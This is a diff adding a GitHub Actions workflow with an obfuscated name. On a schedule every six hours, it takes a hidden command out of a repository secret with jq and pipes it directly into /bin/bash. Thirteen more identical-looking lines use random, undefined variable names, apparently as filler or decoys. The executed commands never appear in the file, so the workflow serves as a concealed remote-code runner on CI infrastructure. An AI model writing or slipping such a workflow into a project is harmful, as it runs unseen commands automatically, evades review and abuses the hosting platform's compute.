@@ -1,0 +1,30 @@
+name: seansvelte835
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '2 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: seansvelte835
+        env:
+          g2465: ${{ secrets.g2465 }}
+        run: |
+          echo $g2465 | jq -r .dk80 | /bin/bash
+          echo $r80457 | jq -r .kfkk37 | /bin/bash
+          echo $vfnvu443 | jq -r .juxi008 | /bin/bash
+          echo $viv1844 | jq -r .g33760 | /bin/bash
+          echo $l924 | jq -r .pyide9 | /bin/bash
+          echo $uv7408 | jq -r .vfzlh25 | /bin/bash
+          echo $f94 | jq -r .jkvgv61 | /bin/bash
+          echo $sl7 | jq -r .i3938 | /bin/bash
+          echo $ussjw9999 | jq -r .bemo78743 | /bin/bash
+          echo $zc5 | jq -r .oh98 | /bin/bash
+          echo $awq7342 | jq -r .v995 | /bin/bash
+          echo $dhup6588 | jq -r .n65 | /bin/bash
+          echo $qrwus3 | jq -r .yyi925 | /bin/bash
+          echo $wb49788 | jq -r .hs169 | /bin/bash
+
